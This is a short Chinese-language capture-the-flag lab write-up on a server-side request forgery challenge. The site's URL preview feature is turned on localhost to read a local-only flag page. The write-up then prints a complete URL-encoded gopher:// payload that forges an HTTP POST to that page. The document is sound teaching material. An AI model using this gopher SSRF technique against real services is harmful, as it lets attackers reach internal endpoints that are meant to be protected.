# LAB - Preview Card
###### tags: `資安` `Web`

## 題目解析
進入網頁可以看到有 Web Preview 跟 FLAG 的連結，點 FLAG 是沒辦法直接拿到 FLAG 的，會顯示 local host only！另外 Web Preview 則是可以瀏覽輸入網址的網頁內容。

![](https://i.imgur.com/y9keaMw.png)

## 解題流程
透過 Web Preview 我們就可以藉由定向的方式輸入 http://127.0.0.1/flag.php 用 local 端查看 flag.php 的 source code，可以看到有一個 input tag，預設是 no，改成 yes 按下 submmit 發出挾帶 {givemeflag=yes} 這個 form-data 的 POST 請求，應該就可以拿到 FLAG 了。

![](https://i.imgur.com/QoIIqxh.png)


但 flag.php 一定要從 local 去訪問，因此我們就可以透過 gopher 協議建構 HTTP 封包去發送 POST 請求。

為了建構出完整 HTTP 封包，我們可以用 nc 跟 curl 的收發來得到完整的 HTTP request，就不用手動打。

![](https://i.imgur.com/DQr43ja.png)

將過 URL encode 後按照 gopher 的規定建構封包就可以拿到 FLAG 了！

```
gopher://127.0.0.1:80/_POST%20%2Fflag.php%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A9000%0D%0AUser-Agent%3A%20curl%2F7.74.0%0D%0AAccept%3A%20%2A%2F%2A%0D%0AContent-Length%3A%2014%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Agivemeflag%3Dyes%0D%0A
```

## FLAG 截圖
![](https://i.imgur.com/jDVqOhT.png)

